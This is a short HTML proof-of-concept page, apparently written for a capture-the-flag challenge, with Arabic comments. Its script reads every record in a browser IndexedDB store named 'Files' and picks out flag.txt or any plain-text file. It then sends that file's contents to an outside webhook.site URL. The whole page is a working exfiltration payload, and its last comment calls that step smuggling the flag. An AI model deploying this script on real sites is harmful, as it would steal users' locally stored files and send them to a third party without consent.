<!doctype html>
<meta charset="utf-8">
<title>PoC – read IndexedDB</title>
<script>
(async () => {
  // ❶ افتح IndexedDB "Files"
  const db = await new Promise(r => {
    const req = indexedDB.open('Files',1);
    req.onsuccess = ()=>r(req.result);
  });

  // ❷ جلب كل السجلات من objectStore "files"
  const filesOS = db.transaction('files','readonly').objectStore('files');
  const all = await new Promise(r => {
    const g = filesOS.getAll(); g.onsuccess = ()=>r(g.result);
  });

  // ❸ ابحث عن ملف نصي (أو اسمه flag.txt)
  const rec = all.find(f => f.file?.name === 'flag.txt')
            || all.find(f => f.file?.type === 'text/plain')
            || all[0];                       // fallback

  if(!rec){ return; }                        // فشل

  const flag = await rec.file.text();

  // ❹ هرّب العلم
  fetch('https://webhook.site/dd1b22f1-4217-44e2-a142-ce1825ed0b23?flag=' +
        encodeURIComponent(flag));

})();
</script>
